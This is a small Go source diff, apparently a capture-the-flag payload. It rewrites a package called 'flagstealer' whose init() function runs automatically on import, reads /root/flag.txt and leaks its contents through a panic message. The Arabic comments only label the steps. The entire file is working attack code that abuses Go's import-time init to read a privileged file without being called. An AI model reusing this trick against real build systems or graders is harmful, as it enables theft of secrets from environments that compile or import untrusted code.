@@ -1,14 +1,19 @@
 package flagstealer
 
 import (
-	"fmt"
 	"os"
 )
 
 func init() {
-	data, err := os.ReadFile("/root/flag.txt")
+	// فتح الملف
+	f, err := os.Open("/root/flag.txt")
 	if err != nil {
-		panic("ERROR reading flag: " + err.Error())
+		panic("can't open flag: " + err.Error())
 	}
-	panic("FLAG: " + string(data))
+	defer f.Close()
+
+	// قراءة المحتوى
+	data := make([]byte, 1024) // هنا حجم البيانات اللي هتقرأها
+	n, _ := f.Read(data)        // قراءة البيانات
+	panic("FLAG: " + string(data[:n])) // طباعة الفلاج
 }
